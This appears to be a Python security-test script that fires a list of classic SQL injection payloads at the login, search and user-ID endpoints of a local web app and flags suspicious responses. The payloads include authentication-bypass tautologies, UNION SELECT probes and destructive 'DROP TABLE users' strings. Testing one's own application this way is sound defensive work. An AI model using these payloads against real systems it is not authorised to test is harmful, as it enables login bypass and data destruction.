#!/usr/bin/env python3
"""
SQL Injection Attack Simulation
Tests SQL injection vulnerabilities (even though MongoDB is used)
"""

import requests
import time

BASE_URL = "http://localhost:3001"

# SQL injection payloads
SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "admin' --",
    "admin' #",
    "admin'/*",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1/*",
    "') OR '1'='1--",
    "1' OR '1'='1",
    "1' OR '1'='1' --",
    "1' OR '1'='1' /*",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL, NULL--",
    "' UNION SELECT NULL, NULL, NULL--",
    "1' UNION SELECT 1,2,3--",
    "' AND 1=1--",
    "' AND 1=2--",
    "'; DROP TABLE users--",
    "1'; DROP TABLE users--",
    "' OR 1=1 LIMIT 1 --",
    "admin' OR '1'='1",
    "admin' OR '1'='1'--",
    "admin' OR '1'='1'#",
    "admin' OR '1'='1'/*",
    "admin') OR ('1'='1--",
    "admin') OR ('1'='1'--",
    "1' OR '1'='1' UNION SELECT NULL--",
    "' OR 1=1--",
    "' OR 'a'='a",
    "' OR 'a'='a'--",
    "' OR 'a'='a'/*",
    "') OR ('a'='a",
    "') OR ('a'='a'--",
    "') OR ('a'='a'/*",
    "1' OR '1'='1",
    "1' OR '1'='1'--",
    "1' OR '1'='1'/*",
    "1') OR ('1'='1",
    "1') OR ('1'='1'--",
    "1') OR ('1'='1'/*",
    "admin'--",
    "admin'#",
    "admin'/*",
    "admin')--",
    "admin')#",
    "admin')/*",
    "1' AND '1'='1",
    "1' AND '1'='2",
    "' AND 1=1",
    "' AND 1=2",
    "1' AND 1=1",
    "1' AND 1=2"
]

def test_login_sqli():
    """Test SQL injection in login endpoint"""
    print("🔐 Testing SQL Injection in Login...")
    print(f"Target: {BASE_URL}/api/auth/login\n")
    
    for i, payload in enumerate(SQLI_PAYLOADS[:15], 1):
        try:
            # Test in email field
            response = requests.post(
                f"{BASE_URL}/api/auth/login",
                json={"email": payload, "password": "test"},
                timeout=5
            )
            
            print(f"Payload {i} (email): {payload[:40]}...")
            print(f"   Status: {response.status_code}")
            
            # Check for SQL error messages or unusual responses
            if response.status_code == 200:
                print(f"   ⚠️  Unusual success response!")
            elif "error" in response.text.lower() or "sql" in response.text.lower():
                print(f"   ⚠️  Possible SQL error detected!")
            
            time.sleep(0.3)
            
        except Exception as e:
            print(f"   Error: {e}")

def test_search_sqli():
    """Test SQL injection in search parameter"""
    print("\n🔍 Testing SQL Injection in Search...")
    print(f"Target: {BASE_URL}/api/users?search=PAYLOAD\n")
    
    for i, payload in enumerate(SQLI_PAYLOADS[:10], 1):
        try:
            response = requests.get(
                f"{BASE_URL}/api/users",
                params={"search": payload},
                timeout=5
            )
            
            print(f"Payload {i}: {payload[:40]}...")
            print(f"   Status: {response.status_code}")
            
            if "error" in response.text.lower() or "sql" in response.text.lower():
                print(f"   ⚠️  Possible SQL error detected!")
            
            time.sleep(0.3)
            
        except Exception as e:
            print(f"   Error: {e}")

def test_user_id_sqli():
    """Test SQL injection in user ID parameter"""
    print("\n👤 Testing SQL Injection in User ID...")
    print(f"Target: {BASE_URL}/api/users?id=PAYLOAD\n")
    
    for payload in SQLI_PAYLOADS[:5]:
        try:
            response = requests.get(
                f"{BASE_URL}/api/users",
                params={"id": payload},
                timeout=5
            )
            
            print(f"Payload: {payload[:40]}...")
            print(f"   Status: {response.status_code}")
            
            if "error" in response.text.lower() or "sql" in response.text.lower():
                print(f"   ⚠️  Possible SQL error detected!")
            
            time.sleep(0.3)
            
        except Exception as e:
            print(f"   Error: {e}")

if __name__ == "__main__":
    test_login_sqli()
    test_search_sqli()
    test_user_id_sqli()
    print("\n✅ SQL injection tests completed")
